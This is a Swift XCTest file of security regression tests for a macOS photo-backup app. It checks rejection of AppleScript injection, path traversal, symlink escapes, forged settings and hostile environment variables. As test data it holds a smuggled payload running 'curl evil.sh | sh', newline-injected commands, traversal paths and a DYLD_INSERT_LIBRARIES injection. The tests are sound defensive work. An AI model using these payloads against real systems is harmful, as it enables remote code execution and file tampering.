import CryptoKit
import XCTest

@testable import Kept

/// Regression tests for the security review. Each one pins a specific way
/// untrusted state — UserDefaults, runs.json — could previously reach an
/// interpreter, a file launcher, or a markdown renderer.
final class SecurityTests: XCTestCase {

    // MARK: - AppleScript injection via the stored share URL

    func testWellFormedShareURLsAreAccepted() {
        XCTAssertTrue(Destination.isWellFormedSMBURL("smb://nas.local/PhotoBackup"))
        XCTAssertTrue(Destination.isWellFormedSMBURL("smb://user@nas.local/PhotoBackup"))
        XCTAssertTrue(
            Destination.isWellFormedSMBURL("smb://user@nas.local/PhotoBackup"))
        XCTAssertTrue(Destination.isWellFormedSMBURL("smb://192.168.1.4:445/Photos/Archive"))
    }

    /// Legal SMB share names that the old punctuation blocklist refused, so
    /// a share named like this failed every night. The URL is passed as an
    /// argument, so none of these characters can reach a script interpreter.
    func testShareNamesWithPunctuationAreAccepted() {
        for url in [
            "smb://nas.local/Photos$", "smb://nas.local/Chip's%20Photos",
            "smb://nas.local/A&B", "smb://nas.local/Backup%20(2024)",
            "smb://nas.local/Photo%20Backup",
        ] {
            XCTAssertTrue(Destination.isWellFormedSMBURL(url), url)
        }
    }

    /// The payload that made `osascript -e "mount volume \"...\""` execute
    /// arbitrary code as a child of this app, inheriting its TCC grants.
    func testAppleScriptPayloadIsRejected() {
        XCTAssertFalse(Destination.isWellFormedSMBURL(
            #"smb://host/share" & (do shell script "curl evil.sh | sh") & ""#))
    }

    func testControlCharactersAreRejected() {
        let hostile = [
            "smb://host/share\nmount volume \"smb://evil\"",
            "smb://host/share\rx",
            "smb://host/share\tx",
            "smb://host/share\u{0}x",
            "smb://host/share\u{7F}",
            "smb://host/sh are",
            #"smb://host/share""#,
            "smb://host/share\\x",
            "smb://host/share|tee",
        ]
        for url in hostile {
            XCTAssertFalse(Destination.isWellFormedSMBURL(url), "should reject: \(url)")
        }
    }

    func testNonShareURLsAreRejected() {
        XCTAssertFalse(Destination.isWellFormedSMBURL(""))
        XCTAssertFalse(Destination.isWellFormedSMBURL("smb://"))
        XCTAssertFalse(Destination.isWellFormedSMBURL("file:///etc/passwd"))
        XCTAssertFalse(Destination.isWellFormedSMBURL("http://host/share"))
        XCTAssertFalse(Destination.isWellFormedSMBURL("smb://" + String(repeating: "a", count: 1100)))
    }

    // MARK: - Destinations --cleanup must never be pointed at

    func testHomeAndSystemFoldersAreRefusedAsMirrorRoots() {
        let home = FileManager.default.homeDirectoryForCurrentUser.path
        let unsafe = [
            "/", "/Users", "/System", "/Library", "/Applications", "/usr", "/etc", "/var",
            "/Volumes",
            home,
            "\(home)/Documents", "\(home)/Desktop", "\(home)/Downloads", "\(home)/Pictures",
            "\(home)/Library",
        ]
        for path in unsafe {
            XCTAssertTrue(Destination.isUnsafeMirrorRoot(path: path), "should refuse: \(path)")
        }
    }

    func testDedicatedFoldersAreAllowed() {
        let home = FileManager.default.homeDirectoryForCurrentUser.path
        let safe = [
            "/Volumes/PhotoBackup",
            "/Volumes/PhotoBackup/PhotoArchive",
            "\(home)/Pictures/Mirror",
            "\(home)/PhotoMirror",
            "/Users/Shared/PhotoMirror",
        ]
        for path in safe {
            XCTAssertFalse(Destination.isUnsafeMirrorRoot(path: path), "should allow: \(path)")
        }
    }

    /// A traversal that resolves back to a blocked folder must still be caught.
    func testTraversalCannotDisguiseAnUnsafeRoot() {
        let home = FileManager.default.homeDirectoryForCurrentUser.path
        XCTAssertTrue(Destination.isUnsafeMirrorRoot(path: "\(home)/Pictures/../Pictures"))
        XCTAssertTrue(Destination.isUnsafeMirrorRoot(path: "/Volumes/../Volumes"))
        XCTAssertTrue(Destination.isUnsafeMirrorRoot(path: "/Users/.."))
    }

    // MARK: - Launching logs from runs.json

    func testOnlyLogsInsideTheLogDirectoryCanBeOpened() {
        let inside = Config.logDir.appending(path: "2026-07-25_020004.log").path
        XCTAssertNotNil(BackupController.logURL(forStoredPath: inside))
    }

    func testLogPathOutsideTheLogDirectoryIsRefused() {
        // Launching an arbitrary path runs whatever handles it.
        XCTAssertNil(BackupController.logURL(forStoredPath: "/Applications/Calculator.app"))
        XCTAssertNil(BackupController.logURL(forStoredPath: "/tmp/evil.log"))
        XCTAssertNil(
            BackupController.logURL(forStoredPath: Config.logDir.path + "/../../evil.log"))
        // Right prefix, different directory.
        XCTAssertNil(
            BackupController.logURL(forStoredPath: Config.logDir.path + "-evil/x.log"))
        // Inside the directory but not a log.
        XCTAssertNil(
            BackupController.logURL(forStoredPath: Config.logDir.appending(path: "x.app").path))
    }

    // MARK: - Markdown rendering of engine messages

    func testEngineMessagesAreNeverRenderedAsMarkdown() {
        // runs.json is user-writable; a link in a raw message must stay inert.
        let payload = "Backup failed [click here](https://evil.example/steal)"
        let copy = FailureCopy.message(
            kind: .setupFailed, rawMessage: payload, destination: nil, failedAt: nil)
        XCTAssertEqual(copy, .verbatim(payload))
    }

    // MARK: - Staleness watchdog thresholds

    private func run(_ start: Date, _ outcome: RunOutcome?) -> RunRecord {
        var record = RunRecord(trigger: .scheduled, start: start)
        record.outcome = outcome
        return record
    }

    func testStaleMessageAppearsOnlyPastTheThreshold() {
        let now = Date(timeIntervalSince1970: 1_800_000_000)
        let day = 86_400.0
        let history = [run(now.addingTimeInterval(-3 * day), .success)]

        XCTAssertNil(StalenessCheck.staleMessage(history: history, thresholdDays: 5, now: now))
        let message = StalenessCheck.staleMessage(history: history, thresholdDays: 3, now: now)
        XCTAssertNotNil(message)
        XCTAssertTrue(message!.contains("3 days"), message!)
    }

    /// A failed run must not reset the clock — only a success counts.
    func testFailuresDoNotCountAsBackups() {
        let now = Date(timeIntervalSince1970: 1_800_000_000)
        let day = 86_400.0
        let history = [
            run(now.addingTimeInterval(-6 * day), .success),
            run(now.addingTimeInterval(-1 * day), .failed),
            run(now, .cancelled),
        ]
        let message = StalenessCheck.staleMessage(history: history, thresholdDays: 3, now: now)
        XCTAssertNotNil(message, "a failure the same day must not count as a good backup")
        XCTAssertTrue(message!.contains("6 days"), message!)
    }

    /// A fresh install with no destination yet must not start nagging.
    func testSilentWhenNothingHasEverRun() {
        XCTAssertNil(StalenessCheck.staleMessage(history: [], thresholdDays: 3))
    }

    func testSpeaksUpWhenRunsExistButNoneSucceeded() {
        let now = Date(timeIntervalSince1970: 1_800_000_000)
        let history = [run(now.addingTimeInterval(-86_400), .failed)]
        XCTAssertEqual(
            StalenessCheck.staleMessage(history: history, thresholdDays: 3, now: now),
            "No backup has finished yet.")
    }

    func testAuthoredCopyIsStillMarkdown() {
        let copy = FailureCopy.message(
            kind: .diskFull, rawMessage: "ignored", destination: nil, failedAt: nil)
        guard case .authored = copy else {
            return XCTFail("mapped failures should stay authored markdown")
        }
    }

    // MARK: - Links planted in the backup folder

    private func makeBackup() throws -> (root: URL, outside: URL) {
        let base = FileManager.default.temporaryDirectory
            .appending(path: "KeptLinkTests-\(UUID().uuidString)", directoryHint: .isDirectory)
        let root = base.appending(path: "Backup", directoryHint: .isDirectory)
        let outside = base.appending(path: "Outside", directoryHint: .isDirectory)
        try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
        try FileManager.default.createDirectory(at: outside, withIntermediateDirectories: true)
        addTeardownBlock { try? FileManager.default.removeItem(at: base) }
        return (root, outside)
    }

    /// Expiry must never delete through a linked holding folder: aimed at a
    /// home folder, it would empty it.
    func testExpiryDoesNotFollowALinkedHoldingFolder() throws {
        let (root, outside) = try makeBackup()
        try Data("precious".utf8).write(to: outside.appending(path: "taxes.pdf"))
        try FileManager.default.createSymbolicLink(
            at: RemovedPhotos.holdingFolder(in: root), withDestinationURL: outside)

        let result = RemovedPhotos.expire(backupRoot: root, retentionDays: 30)

        XCTAssertEqual(result.expired, [])
        XCTAssertEqual(result.errors.count, 1)
        XCTAssertTrue(FileManager.default.fileExists(atPath: outside.appending(path: "taxes.pdf").path))
    }

    /// A planted day folder pointing elsewhere must not become a way to write
    /// a file there — ~/Library/LaunchAgents, say.
    func testHoldDoesNotMoveThroughALinkedDayFolder() throws {
        let (root, outside) = try makeBackup()
        let now = Date(timeIntervalSince1970: 1_800_000_000)
        let holding = RemovedPhotos.holdingFolder(in: root)
        try FileManager.default.createDirectory(at: holding, withIntermediateDirectories: true)
        try FileManager.default.createSymbolicLink(
            at: holding.appending(path: RemovedPhotos.folderName(for: now)),
            withDestinationURL: outside)
        let planted = root.appending(path: "evil.plist")
        try Data("<plist/>".utf8).write(to: planted)

        XCTAssertThrowsError(try RemovedPhotos.hold(planted, backupRoot: root, now: now))
        XCTAssertFalse(FileManager.default.fileExists(atPath: outside.appending(path: "evil.plist").path))
        XCTAssertTrue(FileManager.default.fileExists(atPath: planted.path))
    }

    func testHoldDoesNotMoveThroughALinkedHoldingFolder() throws {
        let (root, outside) = try makeBackup()
        try FileManager.default.createSymbolicLink(
            at: RemovedPhotos.holdingFolder(in: root), withDestinationURL: outside)
        let planted = root.appending(path: "evil.plist")
        try Data("<plist/>".utf8).write(to: planted)

        XCTAssertThrowsError(try RemovedPhotos.hold(planted, backupRoot: root))
        XCTAssertEqual(try FileManager.default.contentsOfDirectory(atPath: outside.path), [])
    }

    /// A source path that runs through a linked folder is somewhere else's
    /// file — osxphotos never descends through a link to hand it over.
    func testHoldRefusesASourceReachedThroughALink() throws {
        let (root, outside) = try makeBackup()
        let secret = outside.appending(path: "chat.db")
        try Data("secret".utf8).write(to: secret)
        try FileManager.default.createSymbolicLink(
            at: root.appending(path: "2024"), withDestinationURL: outside)

        XCTAssertThrowsError(
            try RemovedPhotos.hold(root.appending(path: "2024/chat.db"), backupRoot: root))
        XCTAssertTrue(FileManager.default.fileExists(atPath: secret.path))
    }

    func testEmptyFolderCleanupDoesNotFollowLinks() throws {
        let (root, outside) = try makeBackup()
        let emptyElsewhere = outside.appending(path: "Empty", directoryHint: .isDirectory)
        try FileManager.default.createDirectory(at: emptyElsewhere, withIntermediateDirectories: true)
        try FileManager.default.createSymbolicLink(
            at: root.appending(path: "2024"), withDestinationURL: outside)

        RemovedPhotos.removeEmptyFolders(backupRoot: root, movedFrom: ["2024/Empty/IMG_1.jpg"])
        XCTAssertTrue(FileManager.default.fileExists(atPath: emptyElsewhere.path))
    }

    // MARK: - --hold-removed outside a backup

    /// The test runner was not started by Kept, so the cleanup command's
    /// entry point must refuse to act here.
    func testHoldModeIsRefusedWithoutAKeptAncestor() throws {
        // Xcode's test host is Kept.app itself, started by launchd, so there
        // are no ancestors to check. `swift test` covers this.
        try XCTSkipIf(getppid() == 1, "Started by launchd as Xcode's test host")
        XCTAssertFalse(ProcessAncestry.isDescendantOfOwnExecutable())
        XCTAssertFalse(ProcessAncestry.ancestorExecutables().isEmpty)
    }

    // MARK: - Sealed destination

    private func scratchDefaults() -> UserDefaults {
        Self.scratchDefaults(named: "KeptSecurityTests", for: self)
    }

    private let sample = Destination(path: "/Volumes/PhotoBackup/Mirror", isNetwork: false)

    func testASealedDestinationRoundTrips() {
        let defaults = scratchDefaults()
        let key = SymmetricKey(size: .bits256)
        DestinationStore.save(sample, defaults: defaults, sealingKey: key)
        XCTAssertEqual(DestinationStore.load(defaults: defaults, sealingKey: key), sample)
    }

    /// Rewriting the folder behind Kept's back must not redirect the backup.
    func testADestinationRewrittenOutsideKeptIsIgnored() throws {
        let defaults = scratchDefaults()
        let key = SymmetricKey(size: .bits256)
        DestinationStore.save(sample, defaults: defaults, sealingKey: key)
        let hostile = Destination(path: "/Users/Shared/loot", isNetwork: false)
        defaults.set(try JSONEncoder().encode(hostile), forKey: DestinationStore.key)
        XCTAssertNil(DestinationStore.load(defaults: defaults, sealingKey: key))
    }

    func testAnUnsealedDestinationIsIgnored() throws {
        let defaults = scratchDefaults()
        defaults.set(try JSONEncoder().encode(sample), forKey: DestinationStore.key)
        XCTAssertNil(DestinationStore.load(defaults: defaults, sealingKey: SymmetricKey(size: .bits256)))
    }

    func testADifferentKeyDoesNotVerify() {
        let defaults = scratchDefaults()
        DestinationStore.save(sample, defaults: defaults, sealingKey: SymmetricKey(size: .bits256))
        XCTAssertNil(DestinationStore.load(defaults: defaults, sealingKey: SymmetricKey(size: .bits256)))
        XCTAssertNil(DestinationStore.load(defaults: defaults, sealingKey: nil))
    }

    /// `swift test` has no keychain entitlement, so it's on the login
    /// keychain, and the migration below never reads the real keychain there.
    /// Xcode's test host, signed with a profile, has the entitlement.
    func testAnUnentitledBuildUsesTheLoginKeychain() throws {
        try XCTSkipIf(SettingsSeal.store == .dataProtection, "Running in an entitled test host")
        XCTAssertNil(SettingsSeal.legacyKeyForMigration())
    }

    /// With the entitlement, the login-keychain side of the migration must
    /// never see the data-protection key. It did: reading "the login key"
    /// found the real one, and deleting it deleted the key just made.
    func testTheLoginSideNeverReachesTheDataProtectionKey() throws {
        try XCTSkipIf(SettingsSeal.store != .dataProtection, "Needs a provisioned test host")
        let service = "com.chipcressman.Kept.tests.migration.\(UUID().uuidString)"
        addTeardownBlock { _ = SettingsSeal.deleteKey(service: service) }
        let key = try XCTUnwrap(SettingsSeal.key(service: service))
        func bytes(_ key: SymmetricKey?) -> Data? { key?.withUnsafeBytes { Data($0) } }

        XCTAssertNil(SettingsSeal.legacyKeyForMigration(service: service))
        SettingsSeal.deleteLegacyKey(service: service)
        XCTAssertEqual(bytes(SettingsSeal.key(service: service)), bytes(key))
    }

    /// Updating from 1.0 keeps the folder: a seal made with the login-keychain
    /// key is made again with the new one, and the old key goes.
    func testAFolderSealedBy10IsCarriedOver() {
        let defaults = scratchDefaults()
        let legacy = SymmetricKey(size: .bits256)
        let fresh = SymmetricKey(size: .bits256)
        DestinationStore.save(sample, defaults: defaults, sealingKey: legacy)
        var migrated = 0
        XCTAssertEqual(
            DestinationStore.load(
                defaults: defaults, sealingKey: SymmetricKey(size: .bits256),
                legacyKey: legacy, resealingKey: fresh, legacyMigrated: { migrated += 1 }),
            sample)
        XCTAssertEqual(migrated, 1)
        // Sealed with the new key now; the old one no longer opens it.
        XCTAssertEqual(DestinationStore.load(defaults: defaults, sealingKey: fresh), sample)
        XCTAssertNil(DestinationStore.load(
            defaults: defaults, sealingKey: legacy, legacyKey: nil, resealingKey: nil))
    }

    /// The carry-over is for a seal the old key made, nothing else.
    func testTheCarryOverDoesNotAcceptAForgedSeal() throws {
        let defaults = scratchDefaults()
        DestinationStore.save(sample, defaults: defaults, sealingKey: SymmetricKey(size: .bits256))
        let hostile = Destination(path: "/Users/Shared/loot", isNetwork: false)
        defaults.set(try JSONEncoder().encode(hostile), forKey: DestinationStore.key)
        var migrated = 0
        XCTAssertNil(DestinationStore.load(
            defaults: defaults, sealingKey: SymmetricKey(size: .bits256),
            legacyKey: SymmetricKey(size: .bits256), resealingKey: SymmetricKey(size: .bits256),
            legacyMigrated: { migrated += 1 }))
        XCTAssertEqual(migrated, 0)
    }

    // MARK: - Round 2: P4/P5 hardening

    /// Children get an allow-list: nothing a launcher chose survives except
    /// locale, and PATH is fixed.
    func testChildEnvironmentIsAnAllowList() {
        let inherited = [
            "PATH": "/tmp/evil:/usr/bin", "HOME": "/tmp/evil-home", "TMPDIR": "/tmp/evil-tmp",
            "DYLD_INSERT_LIBRARIES": "/tmp/x.dylib", "PYTHONPATH": "/tmp", "BASH_ENV": "/tmp/rc",
            "SSL_CERT_FILE": "/tmp/ca.pem", "LANG": "en_US.UTF-8", "LC_ALL": "en_US.UTF-8",
        ]
        let child = ChildEnvironment.sanitized(from: inherited)
        XCTAssertEqual(child["PATH"], ChildEnvironment.path)
        XCTAssertEqual(child["HOME"], String(cString: getpwuid(getuid())!.pointee.pw_dir))
        XCTAssertNotEqual(child["TMPDIR"], "/tmp/evil-tmp")
        XCTAssertEqual(child["LANG"], "en_US.UTF-8")
        XCTAssertEqual(child["LC_ALL"], "en_US.UTF-8")
        for key in ["DYLD_INSERT_LIBRARIES", "PYTHONPATH", "BASH_ENV", "SSL_CERT_FILE"] {
            XCTAssertNil(child[key], key)
        }
    }

    /// A lock naming a live pid that isn't Kept — a crash's lock, the pid
    /// since reused — must not block backups.
    func testALockHeldByAnUnrelatedProcessIsNotAKeptBackup() {
        XCTAssertFalse(BackupEngine.isKept(pid: 1, ownName: "Kept"))  // launchd
        XCTAssertTrue(BackupEngine.isKept(
            pid: getpid(),
            ownName: (ProcessAncestry.executablePath(of: getpid())! as NSString).lastPathComponent))
    }

    func testPrivateSystemFoldersAreRefused() {
        for path in ["/private/tmp", "/private/var", "/private/etc"] {
            XCTAssertTrue(Destination.isUnsafeMirrorRoot(path: path), path)
        }
    }

    /// "/Volumes/Macintosh HD" is a link to "/"; picked, it must be refused.
    func testALinkToAnUnsafeFolderIsRefusedWhenPicked() throws {
        let base = FileManager.default.temporaryDirectory
            .appending(path: "KeptUnsafeLink-\(UUID().uuidString)", directoryHint: .isDirectory)
        try FileManager.default.createDirectory(at: base, withIntermediateDirectories: true)
        addTeardownBlock { try? FileManager.default.removeItem(at: base) }
        let link = base.appending(path: "Disk")
        try FileManager.default.createSymbolicLink(atPath: link.path, withDestinationPath: "/")
        XCTAssertTrue(Destination.isUnsafeMirrorRoot(path: link.path, resolvingLinks: true))
        XCTAssertFalse(Destination.isUnsafeMirrorRoot(path: base.path, resolvingLinks: true))
    }

    /// Rotating the key on every save means an old sealed setting can't be
    /// put back. Simulated with explicit keys: the store saves under a new one.
    func testAnOldSealedDestinationCannotBeReplayed() throws {
        let defaults = scratchDefaults()
        let old = SymmetricKey(size: .bits256)
        DestinationStore.save(sample, defaults: defaults, sealingKey: old)
        let oldBlob = try XCTUnwrap(defaults.data(forKey: DestinationStore.key))
        let oldSeal = try XCTUnwrap(defaults.data(forKey: DestinationStore.sealKey))

        let current = SymmetricKey(size: .bits256)
        let chosen = Destination(path: "/Volumes/PhotoBackup/New", isNetwork: false)
        DestinationStore.save(chosen, defaults: defaults, sealingKey: current)
        defaults.set(oldBlob, forKey: DestinationStore.key)
        defaults.set(oldSeal, forKey: DestinationStore.sealKey)
        XCTAssertNil(DestinationStore.load(defaults: defaults, sealingKey: current))
    }

    /// Paths read back from osxphotos' output must not climb out of the
    /// backup folder, even to remove an empty folder.
    func testEmptyFolderCleanupStaysInsideTheBackup() throws {
        let (root, outside) = try makeBackup()
        let sibling = outside.appending(path: "Empty", directoryHint: .isDirectory)
        try FileManager.default.createDirectory(at: sibling, withIntermediateDirectories: true)
        try FileManager.default.createDirectory(
            at: root.appending(path: "2024"), withIntermediateDirectories: true)

        RemovedPhotos.removeEmptyFolders(
            backupRoot: root, movedFrom: ["2024/../../Outside/Empty/IMG_1.jpg"])
        XCTAssertTrue(FileManager.default.fileExists(atPath: sibling.path))
    }

    /// Expiry deletes a dated folder's contents without descending into a
    /// link inside it.
    func testExpiryDeletesLinksAsThemselves() throws {
        let (root, outside) = try makeBackup()
        let precious = outside.appending(path: "precious.txt")
        try Data("keep".utf8).write(to: precious)
        let day = RemovedPhotos.holdingFolder(in: root).appending(path: "2020-01-01")
        try FileManager.default.createDirectory(at: day, withIntermediateDirectories: true)
        try FileManager.default.createSymbolicLink(
            at: day.appending(path: "escape"), withDestinationURL: outside)

        let result = RemovedPhotos.expire(backupRoot: root, retentionDays: 30)
        XCTAssertEqual(result.errors, [])
        XCTAssertEqual(result.expired.map(\.name), ["2020-01-01"])
        XCTAssertTrue(FileManager.default.fileExists(atPath: precious.path))
        XCTAssertFalse(FileManager.default.fileExists(atPath: day.path))
    }

    /// A child that floods its output can't grow Kept without limit — and,
    /// writing far more than a pipe holds to stdout while stderr stays open,
    /// must not deadlock the reader (it did, before collect drained each
    /// stream on its own thread).
    func testCommandOutputIsCapped() async {
        let result = await ShellCommand.run(
            "/bin/sh", ["-c", "yes | head -c 6000000"], timeout: 60)
        XCTAssertEqual(result.status, 0)
        XCTAssertLessThan(result.stdout.utf8.count, ShellCommand.outputLimit + 100)
        XCTAssertTrue(result.stdout.hasSuffix("[output truncated]\n"))
    }

    /// An emptied preferences suite under a fixed name, emptied again after
    /// the test. A fresh UUID-named suite per test left one more plist in
    /// ~/Library/Preferences every run: removePersistentDomain empties a suite
    /// but cfprefsd keeps its file, even writing it back after a delete.
    static func scratchDefaults(named name: String, for test: XCTestCase) -> UserDefaults {
        UserDefaults.standard.removePersistentDomain(forName: name)
        test.addTeardownBlock { UserDefaults.standard.removePersistentDomain(forName: name) }
        return UserDefaults(suiteName: name)!
    }
}
